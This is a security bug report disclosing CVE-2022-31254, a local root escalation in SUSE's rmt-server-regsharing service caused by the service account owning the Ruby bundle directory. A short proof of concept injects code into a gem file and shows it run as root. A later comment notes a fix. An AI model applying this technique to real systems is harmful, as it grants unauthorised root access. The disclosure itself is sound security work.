| [Description](show_bug.cgi?id=1204285#c0)  Johannes Segitz   2022-10-13 15:16:02 UTC  ``` +++ This bug was initially created as a clone of [Bug #1202936](show_bug.cgi?id=1202936 "RESOLVED FIXED") +++  rmt-server-regsharing.service runs this:  ExecStart=/usr/bin/bundle.ruby2.5 exec rake regsharing:sync  This uses the bundle in /usr/share/rmt/.bundle. /usr/share/rmt and below is owned by _rmt. So _rmt can edit /usr/share/rmt/.bundle/config and gain code execution as root this way. POC:  sh-4.4$ id uid=462(_rmt) gid=464(nginx) groups=464(nginx) sh-4.4$ cp -r /usr/lib64/rmt/vendor/bundle/ /tmp/bundle sh-4.4$ cd /tmp/bundle/ruby/2.5.0/gems/loofah-2.15.0/lib  edit loofah.rb and add the code you want to run as root, e.g.:  File.open("/out.txt", "w") do |f|   f.write("owned") end  as root: systemctl start rmt-server-regsharing.service  sh-4.4$ ls -l /out.txt -rw-r--r-- 1 root root 5 Oct  8 16:32 /out.txt  Impact is limited due to the systemd service hardenings mounting a lot of directories as read only. But I'm pretty sure that this is a more general issue, as this bundle is likely used elsewhere. Opening this now as I'm leaving for today and want to give you a chance to look at this.  Please use CVE-2022-31254 for this ``` [Comment 15](show_bug.cgi?id=1204285#c15)  Swamp Workflow Management   2023-01-03 23:21:10 UTC  ``` SUSE-SU-2023:0021-1: An update that solves one vulnerability and has two fixes is now available.
